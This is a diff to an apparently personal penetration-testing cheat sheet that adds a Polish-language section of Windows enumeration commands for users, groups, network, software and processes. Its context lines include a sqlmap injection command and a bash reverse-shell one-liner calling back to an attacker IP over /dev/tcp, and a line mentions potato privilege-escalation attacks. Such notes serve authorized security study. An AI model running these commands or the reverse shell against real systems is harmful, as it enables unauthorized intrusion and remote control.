@@ -355,6 +355,98 @@ sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_passwo
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.45.177/4444 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 ```
 # Red team - WINDOWS
+## Situational awareness
+### Użytkownik, host i uprawnienia (Kto i gdzie?)
+```
+whoami
+```
+Zwraca nazwę aktualnie zalogowanego użytkownika (w formacie domena\użytkownik).
+```
+hostname
+```
+Zwraca nazwę komputera.
+```
+whoami /groups
+```
+Pokazuje wszystkie grupy, do których należy obecny użytkownik (kluczowe do szukania uprawnień administratora).
+```
+net user <nazwa_uzytkownika>
+```
+Wyświetla szczegółowe informacje i ustawienia dla konkretnego konta użytkownika.
+
+### Konta i grupy w systemie (Kto tu jeszcze jest?)
+```
+net user
+``` 
+– Wypisuje wszystkie konta lokalnych użytkowników utworzone w systemie.
+```
+Get-LocalUser
+``` 
+– Odpowiednik powyższego dla PowerShella.
+```
+net localgroup
+```
+ – Wypisuje wszystkie lokalne grupy w systemie (np. Goście, Administratorzy, Użytkownicy Pulpitu Zdalnego).
+```
+Get-LocalGroup
+``` 
+– Odpowiednik powyższego dla PowerShella.
+```
+net localgroup Administrators
+``` 
+– Wyświetla dokładną listę użytkowników, którzy mają uprawnienia administracyjne.
+
+### Informacje o systemie operacyjnym (Na czym pracujemy?)
+```
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+ – Szybko filtruje z długiego raportu tylko nazwę, dokładną wersję (build) i architekturę Windowsa.
+```
+wmic os get Caption, OSArchitecture, Version
+```
+ – Alternatywny sposób na pobranie nazwy i wersji systemu operacyjnego w przejrzystej tabeli.
+
+### Sieć (Jak system komunikuje się ze światem?)
+```
+ipconfig /all
+```
+ – Zwraca pełną konfigurację wszystkich kart sieciowych (adresy IP, maski, DNS, adresy MAC fizycznych interfejsów).
+```
+netstat -ano
+```
+ – Wypisuje wszystkie aktywne połączenia sieciowe oraz porty, na których system nasłuchuje, wraz z przypisanymi identyfikatorami procesów (PID).
+```
+arp -a 
+```
+– Wyświetla tablicę ARP (pokazuje adresy IP i MAC innych urządzeń w sieci lokalnej, z którymi ten komputer niedawno się komunikował - świetne do pivotingu).
+```
+route print
+```
+ – Pokazuje tablicę routingu (informuje, którędy pakiety są wysyłane do innych podsieci).
+
+### Oprogramowanie (Co jest zainstalowane?)
+```
+wmic product get name, version
+```
+ – Listuje aplikacje zainstalowane przez Instalatora Windows (MsiExec) wraz z ich wersjami.
+```
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname"
+```
+ – Błyskawicznie wyciąga listę zainstalowanych programów bezpośrednio z rejestru (omija powolność narzędzia wmic).
+```
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion
+```
+ – (PowerShell) Zwraca czytelną tabelę z nazwami i wersjami oprogramowania.
+
+### Procesy (Co aktualnie działa w tle?)
+```
+tasklist /v
+```
+ – Wypisuje wszystkie uruchomione procesy wraz z informacją (dzięki fladze /v), na jakim koncie użytkownika dany proces działa.
+```
+Get-Process
+```
+ – (PowerShell) Listuje aktualnie działające procesy systemowe wraz z użyciem zasobów.
 # AD
 ## Privileges
 **SeImpersonatePrivilege:** As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.  
